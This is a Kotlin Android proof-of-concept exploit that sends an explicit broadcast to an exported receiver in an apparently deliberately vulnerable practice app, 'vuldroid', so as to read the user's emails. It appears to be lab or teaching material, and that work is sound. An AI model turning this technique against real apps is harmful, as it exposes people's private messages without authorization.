package vulndroid.exploit.app

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity

class EmailBroadcast : AppCompatActivity() {

    // vuln exploited: Reading user emails through exported broadcast receiver
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d("PWNAPP", "unauthorized viewing of emails")
        val broadcast = Intent()
        broadcast.action = "com.example.Broadcast"
        broadcast.setClassName("com.vuldroid.application", "com.vuldroid.application.MyReceiver")
        sendBroadcast(broadcast)
    }
}